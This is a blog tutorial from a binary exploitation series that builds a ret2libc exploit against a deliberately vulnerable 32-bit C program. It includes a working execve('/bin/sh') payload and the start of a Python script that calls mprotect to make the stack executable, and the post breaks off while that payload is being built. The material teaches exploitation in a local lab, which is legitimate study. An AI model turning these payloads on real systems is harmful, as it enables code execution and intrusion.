---
layout: post
title: Defeating Write XOR Execute! - Ret2Libc - Part2
categories: Reverse Engineering and Binary Exploitation Series
comments: true
---

Hey fellow pwners!

In the [previous post](/reverse/engineering/and/binary/exploitation/series/2019/03/04/return-to-libc-part1.html), we saw a new exploit method which was designed to bypass the **Write XOR Execute** security technique. 

What we did was something powerful!. We got a shell without code injection. 

In this post, we will explore **Ret2Libc** in detail and see if Ret2Libc can be combined with Code Injection to come up with a powerful exploit. 

This is the 15th post. So, create a **post_15** directory inside **rev_eng_series**. 

**Disable ASLR throughout the post** - will be easy to experiment with stuff. 

Let us get started!

## 1. Can we use execve to get a shell?

In the previous post, we used **system** libc function to get a shell. Let us try out the same with **execve**. This is an exercise to make sure we have understood Ret2Libc. This is important because we will be building on this in later articles. 

Let us use the same vulnerable program we had used in the previous post. 

    rev_eng_series/post_15}=)> cat defeat.c
    #include<stdio.h>

    void func() {

        char buffer[100];
        gets(buffer);

    }

    int main() {

        printf("Before calling func\n");
        func();
        printf("After calling func\n");

        return 0;
    }
    rev_eng_series/post_15}=)> gcc defeat.c -o defeat -m32 -fno-stack-protector
    defeat.c: In function ‘func’:
    defeat.c:6:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
    gets(buffer);
    ^
    /tmp/ccdssL6A.o: In function `func':
    defeat.c:(.text+0xe): warning: the `gets' function is dangerous and should not be used.

Note that we have compiled it **without** Stack canary. 

Let us first write steps which will help design the exploit. 

1. Revisit the **execve** function.
2. Find execve's address in libc - **execve_address**. 
3. Find addresses of the arguments required by execve. 
4. Find the amount of junk to put in the payload. 

### a. Revisit the execve function

The following is from execve's manpage. 

    EXECVE(2)                  Linux Programmer's Manual                 EXECVE(2)

    NAME
        execve - execute program

    SYNOPSIS
        #include <unistd.h>

        int execve(const char *filename, char *const argv[],
                    char *const envp[]);

It is pretty straight forward. If you need a detailed description of execve, visit [this post](/reverse/engineering/and/binary/exploitation/series/2018/12/02/exploitation-using-code-injection-part02.html). 

If we need a shell, we have to execute the following: 

    execve("/bin/sh", 0, 0); 

    OR

    execve("/bin/bash", 0, 0);

We can see that **execve** is taking 3 arguments: **address** of "/bin/sh", **0** and **0**. 

First we have to find the address of **execve** in libc. 

### b. Finding execve's address in libc

We have used a method in the previous post to find system's address. You can find execve's address also in the same manner. 

This is the idea. First, find the offset at which execve function is present in **libc.so**. Then, run the vulnerable program, find libc's base address by checking out it's /proc/PID/maps file. Adding libc's base address with that offset should give execve's address. 

Let us open the vulnerable program in gdb and get all the details at once. 

    rev_eng_series/post_15}=)> gdb -q defeat
    Reading symbols from defeat...(no debugging symbols found)...done.
    gdb-peda$ b func
    Breakpoint 1 at 0x8048441
    gdb-peda$ run
    Starting program: /home/adwi/ALL/rev_eng_series/post_15/defeat 
    Before calling func

* Let us find execve's address first. 

        gdb-peda$ print execve
        $1 = {<text variable, no debug info>} 0xf7ea37e0 <execve>

* Let us see if there is a **/bin/sh** inside the memory layout. 

        gdb-peda$ find "/bin/sh"
        Searching for '/bin/sh' in: None ranges
        Found 1 results, display max 1 items:
        libc : 0xf7f4ea0b ("/bin/sh")

* We also need 0x00000000 as the second and third arguments of execve are NULL. 

        gdb-peda$ find 0x00000000
        Searching for '0x00000000' in: None ranges
        Found 102587 results, display max 256 items:
        defeat : 0x8048007 --> 0x0 
        defeat : 0x804800b --> 0x0 
        defeat : 0x8048022 --> 0x0 
        defeat : 0x8048075 --> 0x0 
        defeat : 0x8048079 --> 0x0 
        defeat : 0x804808d --> 0x0 
        defeat : 0x80480ad --> 0x0 
        defeat : 0x8048118 --> 0x0 
        defeat : 0x804811c --> 0x0 
        defeat : 0x8048120 --> 0x0 
        defeat : 0x8048124 --> 0x0 
        defeat : 0x8048128 --> 0x0 
        defeat : 0x8048177 --> 0x0 
        defeat : 0x80481b9 --> 0x0 
        defeat : 0x80481c0 --> 0x0 
        defeat : 0x80481cc --> 0x0 
        defeat : 0x80481d0 --> 0x0 
        defeat : 0x80481d4 --> 0x0 
        defeat : 0x80481d8 --> 0x0 
        defeat : 0x80481dd --> 0x0 
        defeat : 0x80481e1 --> 0x0 
        defeat : 0x80481ed --> 0x0 
        defeat : 0x80481f1 --> 0x0 
        defeat : 0x80481fd --> 0x0 

So, there are loads of NULL characters. 

Note that **execve** and **/bin/sh** are both present in **libc**. So, let us find libc's base address and find their offsets in libc. We can find out libc's base address by looking at the process's **/proc/PID/maps** file. 

    gdb-peda$ getpid
    11809

* Let us look at maps file. Open up another terminal and do the following. 

        rev_eng_series/post_15}=)> cat /proc/11809/maps
        08048000-08049000 r-xp 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
        08049000-0804a000 r--p 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
        0804a000-0804b000 rw-p 00001000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
        0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
        f7df2000-f7df3000 rw-p 00000000 00:00 0 
        f7df3000-f7fa3000 r-xp 00000000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
        f7fa3000-f7fa5000 r--p 001af000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
        f7fa5000-f7fa6000 rw-p 001b1000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
        f7fa6000-f7fa9000 rw-p 00000000 00:00 0 
        f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
        f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
        f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
        f7fd9000-f7ffc000 r-xp 00000000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
        f7ffc000-f7ffd000 r--p 00022000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
        f7ffd000-f7ffe000 rw-p 00023000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
        fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

* libc's base address = 0xf7df30000. 

Therefore, 

**execve_offset** = 0xf7ea37e0 - 0xf7df30000 = **722912**
**binsh_offset** =  0xf7f4ea0b - 0xf7df30000 = **1423883**
**null_address** = **0x8048007** (We are taking the first address)

Note that **/bin/sh** is also present in **libc**'s address space. 

Also note that these addresses might be different in your machine. But the method is the same. 

2. Let us run the vulnerable program normally and get their addresses. 

        rev_eng_series/post_15}=)> ./defeat
        Before calling func

        rev_eng_series/post_15}=)> ps -e | grep defeat
        12607 pts/19   00:00:00 defeat

    * Now, let us open /proc/12607/maps file and get **libc_address**. 

            rev_eng_series/post_15}=)> cat /proc/12607/maps
            08048000-08049000 r-xp 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            08049000-0804a000 r--p 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            0804a000-0804b000 rw-p 00001000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df2000-f7df3000 rw-p 00000000 00:00 0 
            f7df3000-f7fa3000 r-xp 00000000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa3000-f7fa5000 r--p 001af000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa6000 rw-p 001b1000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa6000-f7fa9000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    * **f7df3000-f7fa3000 r-xp 00000000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so** is the range. So, **libc_address = 0xf7df3000**. 

    * **execve_address** = **libc_address** + **execve_offset** => **execve_address = 0xf7ea37e0**. 

    * **binsh_address** = **libc_address** + **binsh_offset** => **binsh_address = 0xf7f4ea0b**. 

Note that we are able to use hardcoded addresses because **ASLR is disabled**. 

Now, we have all the required addresses. 

### c. How much junk to put in the payload?

This is a normal task. Use gdb to find it out. In the executable I am using, the junk length = **112** bytes. 

### d. Write the exploit!

Here is the final part. 

The exploit will look something like this. 

    <'a' - 112 bytes><execve's address><execve's return address><argument0 - address of /bin/sh ><argument1 - address of 0x00000000><argument2 - address of 0x00000000>

Let us put the payload into **exploit.txt**. 

    rev_eng_series/post_15}=)> python -c "print 'a' * 112 + '\xe0\x37\xea\xf7' + 'cccc' + '\x0b\xea\xf4\xf7' + '\x07\x80\x04\x08' + '\x07\x80\x04\x08'" >  exploit.txt

Look at the payload one more time. Make sure you understand it properly. 

That **cccc** is supposed to be execve's return address. 

### e. Exploit it!

    rev_eng_series/post_15}=)> cat exploit.txt - | ./defeat
    Before calling func

    whoami
    adwi

    ls
    defeat	defeat.c  exploit.txt  peda-session-defeat.txt
    
    who
    adwi     tty7         Mar  3 07:51 (:0)

Bingo! We got it!

We got a proper shell. Try it out a couple of times and understand the exploit properly. 


### f. Did the program SegFault?

In the previous post, we saw that the program SegFaulted when we exited from the shell. Let us see if the same happens now. 

    rev_eng_series/post_15}=)> cat exploit.txt - | ./defeat
    Before calling func
    whoami
    adwi

    ls
    defeat	defeat.c  exploit.txt  peda-session-defeat.txt

    who
    adwi     tty7         Mar  3 07:51 (:0)

    ^C
    rev_eng_series/post_15}=)>

Nope! No SegFault. But the Return address was some **cccc** that is **0x63636363**. According to this, the program should have SegFaulted right?

The Secret is in what **execve** is, what it does. **execve** not only runs the program we want, but also replaces the older process with the new process. So, when **execve("/bin/sh", 0, 0)** got executed, **defeat** was erased and it was replaced by the new process **/bin/sh**. So, when we tried to kill / terminate this new process - **/bin/sh**, it ended as if nothing had happened. 

### g. Conclusion

We got a shell without much hussle. 

We bypassed **W^X** using **Ret2Libc** exploit method. 

I hope you have Ret2Libc properly because we will step up a little bit in the next example. 

## 2. Difference between bypassing and defeating something!

I don't know if you have noticed this, in the [previous post](/reverse/engineering/and/binary/exploitation/series/2019/03/04/return-to-libc-part1.html), we **bypassed** W^X. We **did not** defeat it. 

What is the difference?

To know that, let us see what exactly does W^X do.

In simple words, 

1. If we can write into an address space, then we cannot execute the content present in it. 
2. If we are able to execute the content in an address space, then we cannot write into it.

These are the two restrictions put by the OS.

What we have done so far is we have not confronted these restrictions. Suppose we tried to execute something which is present in a writable address space(say stack), then that is confronting W^X and what would have happened? The process would SegFault - that is how the OS punishes us if we **try** to break the rule.

So, what did we do?

We used an exploit method which did not execute a single instruction in a writable address space nor did we write into an executable address space. We got around this rule to get the shell!

The OS is still guarded by the W^X rule. What we did is we used a method to **fool** the rule and the OS. This is bypassing. Fooling the OS and getting around the rule but the rule is still there guarding the OS.

Then what is defeating?

Doing some magic so that those 2 restrictions do not hold good. Removing that rule  . We should be able to write into an executable address space and execute stuff present in a writable address space.

If we are able to do that, the OS is not guarded by that rule anymore. The OS does not have W^X on it's side because it has been defeated. What does this mean? If OS doesn't have W^X, then we can bring back **Code Injection exploit method**!!! 

## 3. How do we defeat W^X?

This is the obvious question. How do we do it?

Can we use Ret2Libc to get it done? Let us see. 

Before we jump into defeating it, we will first see how the OS gives permissions to these address spaces.  

When we run a program from the terminal(or GUI), we know that the Operating System allocates some memory to it. What memory is it? It is a part of main memory or the RAM. Memory is not just allocated. There is more to it. 

If you open up **/proc/PID/maps** file of some process, you would see different address spaces have their own **permissions**. One has **r-- / Read Only**, other has **rw- / Read-Write** and so on. After memory is allocated, how is each of the address spaces getting it's permissions? How is it done?

We will take an example to understand this. 

Consider the following program: 

    rev_eng_series/post_15}=)> cat hello.c
    #include<stdio.h>
    #include<unistd.h>
    int main() {

        printf("PID = %d\n", getpid());
        while(1);
    }

It will simply print it's Process ID and fall into an infinite loop. 

Compile it normally. 

    rev_eng_series/post_15}=)> gcc hello.c -o hello

Now, let us run it. 

    rev_eng_series/post_15}=)> ./hello
    PID = 22552


Let us take a look at it's **/proc/PID/maps** file. Open up a new terminal. 

    rev_eng_series/post_15}=)> cat /proc/22552/maps
    00400000-00401000 r-xp 00000000 08:02 6558861                            /home/adwi/ALL/rev_eng_series/post_15/hello
    00600000-00601000 r--p 00000000 08:02 6558861                            /home/adwi/ALL/rev_eng_series/post_15/hello
    00601000-00602000 rw-p 00001000 08:02 6558861                            /home/adwi/ALL/rev_eng_series/post_15/hello
    00602000-00623000 rw-p 00000000 00:00 0                                  [heap]
    7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:02 25694809                   /lib/x86_64-linux-gnu/libc-2.23.so
    7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:02 25694809                   /lib/x86_64-linux-gnu/libc-2.23.so
    7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:02 25694809                   /lib/x86_64-linux-gnu/libc-2.23.so
    7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:02 25694809                   /lib/x86_64-linux-gnu/libc-2.23.so
    7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
    7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:02 25694777                   /lib/x86_64-linux-gnu/ld-2.23.so
    7ffff7fca000-7ffff7fcd000 rw-p 00000000 00:00 0 
    7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
    7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
    7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:02 25694777                   /lib/x86_64-linux-gnu/ld-2.23.so
    7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:02 25694777                   /lib/x86_64-linux-gnu/ld-2.23.so
    7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
    7ffffffdd000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    adwi@adwi:~/ALL/rev_eng_series/post_15}=)>

Look at this. There are different address spaces, with certain permissions. 

Note the first entry: **00400000-00401000 r-xp 00000000 08:02 6558861                            /home/adwi/ALL/rev_eng_series/post_15/hello**. This is the text segment. **0x00400000** is the starting address of text segment. 

Let us focus on how these permissions are given. 

There is a **system call** called **mprotect** or **memory-protect**. This system call is used to set protection for required memory regions. The following is from mprotect's manpage. 

    MPROTECT(2)                Linux Programmer's Manual               MPROTECT(2)

    NAME
        mprotect - set protection on a region of memory

    SYNOPSIS
        #include <sys/mman.h>

        int mprotect(void *addr, size_t len, int prot);

    DESCRIPTION
        mprotect()  changes protection for the calling process's memory page(s)
        containing  any  part  of   the   address   range   in   the   interval
        [addr, addr+len-1].  addr must be aligned to a page boundary.

        If the calling process tries to access memory in a manner that violates
        the protection, then the kernel generates  a  SIGSEGV  signal  for  the
        process.

        prot  is  either  PROT_NONE  or a bitwise-or of the other values in the
        following list:

        PROT_NONE  The memory cannot be accessed at all.

        PROT_READ  The memory can be read.

        PROT_WRITE The memory can be modified.

        PROT_EXEC  The memory can be executed.

    RETURN VALUE
        On success, mprotect() returns zero.  On error,  -1  is  returned,  and
        errno is set appropriately.

This system call is pretty straightforward. It sets protection on a region of memory. It takes in 3 arguments. **addr** is the start address of that region of memory. **len** is the size of the region. **prot** is what you want the permissions to be. It could be PROT_NONE, PROT_READ, PROT_WRITE, PROT_EXEC. 

To understand this completely, let us modify our example program a little bit and try again. 

Check out this program: 

    rev_eng_series/post_15}=)> cat hello.c
    #include<stdio.h>
    #include<unistd.h>
    #include<sys/mman.h>

    int main() {

        printf("PID = %d\n", getpid());
        
        printf("The text Segment is a r-x segment. Check the maps file.\n");
        printf(">>> Changing it's permissions to rwx...\n");
        printf(">>> Press a character to go ahead and change the permissions \n");
        
        getchar();

        // Important part!
        // Change 0x400000 to the starting address of you text segment
        mprotect(0x400000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
        
        printf(">>> Changed. Check the maps file again!\n");

        while(1);

    }


Read the code carefully. Understand what it is doing. **0x400000** is the starting address text segment on my machine. It may be different in your machine. Go to some process's /proc/PID/maps page, get the text segment's starting address and put it in the program instead of 0x400000. 

Compile it. 

    rev_eng_series/post_15}=)> gcc hello.c -o hello
    hello.c: In function ‘main’:
    hello.c:15:11: warning: passing argument 1 of ‘mprotect’ makes pointer from integer without a cast [-Wint-conversion]
    mprotect(0x400000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
            ^
    In file included from hello.c:3:0:
    /usr/include/x86_64-linux-gnu/sys/mman.h:81:12: note: expected ‘void *’ but argument is of type ‘int’
    extern int mprotect (void *__addr, size_t __len, int __prot) __THROW;


Know what the warnings are but don't worry about them. 

Let us run it. 

    rev_eng_series/post_15}=)> ./hello
    PID = 23902
    The text Segment is a r-x segment. Check the maps file.
    >>> Changing it's permissions to rwx...
    >>> Press a character to go ahead and change the permissions 

    >>> Changed. Check the maps file again!

It is basically changing the permissions of text segment from **r-x** to **rw-**. 

Let us run it again and look at the /proc/PID/maps file as instructed by the program. 

    rev_eng_series/post_15}=)> ./hello
    PID = 23983
    The text Segment is a r-x segment. Check the maps file.
    >>> Changing it's permissions to rwx...
    >>> Press a character to go ahead and change the permissions 

Note that PID might be different in your machine. Take your PID and not this :P

Let us look at **/proc/23983/maps** file. I have put only the first entry because that is what we are experimenting on. 

    rev_eng_series/post_15}=)> cat /proc/23983/maps
    00400000-00401000 r-xp 00000000 08:02 6558858                            /home/adwi/ALL/rev_eng_series/post_15/hello

This is normal. It is a **r-x** segment - Read and Execute only. No write permissions. 

Let us continue our program. 

    rev_eng_series/post_15}=)> ./hello
    PID = 23983
    The text Segment is a r-x segment. Check the maps file.
    >>> Changing it's permissions to rwx...
    >>> Press a character to go ahead and change the permissions 

    >>> Changed. Check the maps file again!


Look at the maps file again. 

    rev_eng_series/post_15}=)> cat /proc/23983/maps
    00400000-00401000 rwxp 00000000 08:02 6558858                            /home/adwi/ALL/rev_eng_series/post_15/hello

Bingo! Look at those permissions. It has changed to **rwx**. That is, Read-Write-Execute. 

So, we have seen what **mprotect** can do. 

## 4. Now, can we defeat W^X?

We have a way to change permissions now - using **mprotect**. 

In Code Injection exploit method, we injected code into a buffer located in stack and then executed it. Then, stack's permissions was **rwx**. But now because of **W^X**, stack's permissions is **rw-**. There is no execute permission. 

Now we know what we have to do. We have to **make the stack executable**. Then try executing it. 

We have a program with a BOF. How do we execute **mprotect**? 

**mprotect** is also a **libc** function. So, instead of executing system function, we will execute **mprotect**.  

1. Find **mprotect**'s address.
2. Find what the arguments are.
3. Design and write the exploit. 
4. GAME OVER!

### a. Finding mprotect's address

The following is the program we have to exploit. 

    rev_eng_series/post_15}=)> cat defeat.c 
    #include<stdio.h>

    void func() {

        char buffer[100];
        gets(buffer);

    }

    int main() {

        printf("Before calling func\n");
        func();
        printf("After calling func\n");

        return 0;
    }
    rev_eng_series/post_15}=)> gcc defeat.c -o defeat -m32 -fno-stack-protector
    defeat.c: In function ‘func’:
    defeat.c:6:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
    gets(buffer);
    ^
    /tmp/ccnI5sYY.o: In function `func':
    defeat.c:(.text+0xe): warning: the `gets' function is dangerous and should not be used.

We are working with a 32-bit executable here. 

This is the plan. 

1. Run **defeat** using gdb. Get mprotect's address. 
2. Read **defeat**'s /proc/PID/maps file and get libc's starting address. 
3. Find the **offset** at which mprotect is present inside libc - **mprotect_offset**.  
4. Run **defeat** normally, find libc's starting address - **libc_address**. 
5. Add **mprotect_offset** to **libc_address** to get **mprotect_address**. 

Let us execute the plan.

1. Run **defeat** using gdb. Get mprotect's address.

        rev_eng_series/post_15}=)> gdb -q defeat
        Reading symbols from defeat...(no debugging symbols found)...done.
        gdb-peda$ b func
        Breakpoint 1 at 0x8048441
        gdb-peda$ run
        Starting program: /home/adwi/ALL/rev_eng_series/post_15/defeat 
        Before calling func


        gdb-peda$ print mprotect
        $1 = {<text variable, no debug info>} 0xf7ed5da0 <mprotect>


2. Read **defeat**'s /proc/PID/maps file and get libc's starting address.

    * To do this, we need it's PID. 

            gdb-peda$ getpid
            25769

    * Now, let us read the maps file. 

            /rev_eng_series/post_15}=)> cat /proc/25769/maps
            08048000-08049000 r-xp 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            08049000-0804a000 r--p 00000000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            0804a000-0804b000 rw-p 00001000 08:02 6558856                            /home/adwi/ALL/rev_eng_series/post_15/defeat
            0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
            f7df2000-f7df3000 rw-p 00000000 00:00 0 
            f7df3000-f7fa3000 r-xp 00000000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa3000-f7fa5000 r--p 001af000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa5000-f7fa6000 rw-p 001b1000 08:02 25694743                           /lib/i386-linux-gnu/libc-2.23.so
            f7fa6000-f7fa9000 rw-p 00000000 00:00 0 
            f7fd3000-f7fd4000 rw-p 00000000 00:00 0 
            f7fd4000-f7fd7000 r--p 00000000 00:00 0                                  [vvar]
            f7fd7000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]
            f7fd9000-f7ffc000 r-xp 00000000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffc000-f7ffd000 r--p 00022000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            f7ffd000-f7ffe000 rw-p 00023000 08:02 25694622                           /lib/i386-linux-gnu/ld-2.23.so
            fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

    * Checkout the 6th entry. This might be different in your machine. Make sure you take the starting address of **Read-Execute** address space of libc. 
    
    * **0xf7df3000** is libc's starting address. 

3. Finding **mprotect_offset**. 

    * It is simply this: **0xf7ed5da0** - **0xf7df3000** = 929184

    * **mprotect_offset = 929184**. 

4. Let us run the program normally and get **libc_address**. 

        gdb-peda$ quit
        rev_eng_series/post_15}=)> ./defeat
        Before calling func


    * In another terminal, 

            rev_eng_series/post_15}=)> ps -e | grep defeat
            26273 pts/1    00:00:00 defeat

    * **defeat**'s PID = 26273. 

    * Now, let us look into it's maps file. The starting address is **0xf7df3000**.

5. So, mprotect's address is 0xf7df3000 + mprotect_offset => **mprotect_address = 0xf7ed5da0**. 

Finally, **mprotect_address = 0xf7ed5da0**. 

### b. Finding what it's arguments are. 

We have found out protect's address. But we need it's arguments. 

We decided to make the process's stack executable. So, let us get stack's starting address and it's size. Open the /proc/PID/maps file again. 

This is the entry: 

    fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

So, **stack_address = 0xfffdc000** - this is the first argument.

It's size is (End_address - Start_address) = 0xffffe000 - 0xfffdc000 = 139264. 

**stack_size = 139264** - This is the second argument. 

Third argument is **PROT_READ bitwise-or PROT_WRITE bitwise-or PROT_EXEC**. These are macros and we cannot put them directly into our exploit payload. We have to find their actual values. 

After a lot of searching, I got the values. They are defined in **/usr/include/asm-generic/mman-common.h** on my 64-bit GNU/Linux system. These are the values: 

    #define PROT_READ       0x1             /* page can be read */
    #define PROT_WRITE      0x2             /* page can be written */
    #define PROT_EXEC       0x4             /* page can be executed */
    #define PROT_SEM        0x8             /* page may be used for atomic ops */
    #define PROT_NONE       0x0             /* page can not be accessed */

We need **PROT_READ bitwise-or PROT_WRITE bitwise-or PROT_EXEC** = **0x1 bitwise-or 0x2 bitwise-or 0x4** = 7. 

So, third argument is **7**. 

### c. Designing the exploit

1. mprotect_address = 0xf7ed5da0
2. argument0 = 0xfffdc000
3. argument1 = 139264 = 0x22000
4. argument2 = 7

In all the arguments, there are **\x00** or NULL characters. We have seen that certain string functions stop reading from standard input once they encounter a NULL character. But **gets** is not one such functions. It will stop taking input only if it encounters a **newline** or **EOF**. So, we can go ahead with our exploit. 

This exploit is a bit complex. So, we will write a python script to get the job done. Let us name the script **exploit.py**

    #!/usr/bin/env python2

    import sys
    import struct

Let us write a function which will generate the payload and write it into a file **exploit.txt**. 

1. Find the length of junk to be put in. This is the difference between buffer address and stack address where Return Address is present. 

    * Let us run **defeat** - our vulnerable program in gdb to get it. 

            rev_eng_series/post_15}=)> gdb -q defeat
            Reading symbols from defeat...(no debugging symbols found)...done.
            gdb-peda$ disass func
            Dump of assembler code for function func:
            0x0804843b <+0>:	push   ebp
            0x0804843c <+1>:	mov    ebp,esp
            0x0804843e <+3>:	sub    esp,0x78
            0x08048441 <+6>:	sub    esp,0xc
            0x08048444 <+9>:	lea    eax,[ebp-0x6c]
            0x08048447 <+12>:	push   eax
            0x08048448 <+13>:	call   0x8048300 <gets@plt>
            0x0804844d <+18>:	add    esp,0x10
            0x08048450 <+21>:	nop
            0x08048451 <+22>:	leave  
            0x08048452 <+23>:	ret    
            End of assembler dump.
            gdb-peda$ b *0x0804843b
            Breakpoint 1 at 0x804843b
            gdb-peda$ run


    * The following is the state just after **func** is called. 

            [----------------------------------registers-----------------------------------]
            EAX: 0x14 
            EBX: 0x0 
            ECX: 0xffffffff 
            EDX: 0xf7fa6870 --> 0x0 
            ESI: 0xf7fa5000 --> 0x1b1db0 
            EDI: 0xf7fa5000 --> 0x1b1db0 
            EBP: 0xffffcc38 --> 0x0 
            ESP: 0xffffcc2c --> 0x8048479 (<main+38>:	sub    esp,0xc)
            EIP: 0x804843b (<func>:	push   ebp)
            EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
            [-------------------------------------code-------------------------------------]
            0x8048432 <frame_dummy+34>:	add    esp,0x10
            0x8048435 <frame_dummy+37>:	leave  
            0x8048436 <frame_dummy+38>:	jmp    0x80483b0 <register_tm_clones>
            => 0x804843b <func>:	push   ebp
            0x804843c <func+1>:	mov    ebp,esp
            0x804843e <func+3>:	sub    esp,0x78
            0x8048441 <func+6>:	sub    esp,0xc
            0x8048444 <func+9>:	lea    eax,[ebp-0x6c]
            [------------------------------------stack-------------------------------------]
            0000| 0xffffcc2c --> 0x8048479 (<main+38>:	sub    esp,0xc)
            0004| 0xffffcc30 --> 0xf7fa53dc --> 0xf7fa61e0 --> 0x0 
            0008| 0xffffcc34 --> 0xffffcc50 --> 0x1 
            0012| 0xffffcc38 --> 0x0 
            0016| 0xffffcc3c --> 0xf7e0b637 (<__libc_start_main+247>:	add    esp,0x10)
            0020| 0xffffcc40 --> 0xf7fa5000 --> 0x1b1db0 
            0024| 0xffffcc44 --> 0xf7fa5000 --> 0x1b1db0 
            0028| 0xffffcc48 --> 0x0 
            [------------------------------------------------------------------------------]
            Legend: code, data, rodata, value

            Breakpoint 1, 0x0804843b in func ()
            gdb-peda$ 


    * Look at the stack. The Top of the stack has the Return Address. The Stack address is 0xffffcc2c. 

    * Let us stop just before **gets** is executed. The buffer address is given as argument to gets. Look at the following state. 

            [-------------------------------------code-------------------------------------]
            0x8048441 <func+6>:	sub    esp,0xc
            0x8048444 <func+9>:	lea    eax,[ebp-0x6c]
            0x8048447 <func+12>:	push   eax
            => 0x8048448 <func+13>:	call   0x8048300 <gets@plt>
            0x804844d <func+18>:	add    esp,0x10
            0x8048450 <func+21>:	nop
            0x8048451 <func+22>:	leave  
            0x8048452 <func+23>:	ret
            Guessed arguments:
            arg[0]: 0xffffcbbc --> 0xf7e5de12 (<__overflow+66>:	add    esp,0x14)
            arg[1]: 0x804b008 ("Before calling func\n")
            [------------------------------------stack-------------------------------------]
            0000| 0xffffcba0 --> 0xffffcbbc --> 0xf7e5de12 (<__overflow+66>:	add    esp,0x14)
            0004| 0xffffcba4 --> 0x804b008 ("Before calling func\n")
            0008| 0xffffcba8 --> 0x14 
            0012| 0xffffcbac --> 0xf7e5d3ac (<_IO_file_overflow+12>:	add    edx,0x147c54)
            0016| 0xffffcbb0 --> 0xf7fa5000 --> 0x1b1db0 
            0020| 0xffffcbb4 --> 0xf7fa5d60 --> 0xfbad2a84 
            0024| 0xffffcbb8 --> 0xf7fa6870 --> 0x0 
            0028| 0xffffcbbc --> 0xf7e5de12 (<__overflow+66>:	add    esp,0x14)
            [------------------------------------------------------------------------------]
            Legend: code, data, rodata, value
            0x08048448 in func ()
            gdb-peda$ 

    * Look at the Top of stack. **0xffffcbbc** is the buffer address. 

* junk_length = stack_address_where_return_address_is_found - buffer_address = 0xffffcc2c - 0xffffcbbc = **112** bytes. 

The payload is like this: 


    <'a' - 112 bytes><mprotect_address - 4 bytes><mprotect's return address - 4 bytes><argument0 - 4 bytes><argument1 - 4 bytes><argument2 - 4 bytes>

For now, let mprotect's return address be **0x63636363** or "cccc". 

First, load all the values into variables. 

    def exploit() :

        junk_length = 112

        # Variables related to calling mprotect.
        mprotect_address = 0xf7ed5da0
        return_address = 0x63636363
        argument0 = 0xfffdc000
        argument1 = 139264
        argument2 = 7

Now, let us build the payload. 

python's **struct** module has function called **pack**. It will take an integer and turn it into required form of binary data. 

We need to convert each one of these variables into 4-bytes of little-endian binary data. So, the following will do it for us. 

        # First, fill in with required amount of junk.
        payload = junk_length * 'a'

        # mprotect's address in little-endian form. This will overwrite func's return address. 
        payload += struct.pack('<I', mprotect_address)

         # mprotect's return address
        payload += struct.pack('<I', return_address)
        
        # The 3 arguments, each in little-endian form. 
        payload += struct.pack('<I', argument0)
        payload += struct.pack('<I', argument1)
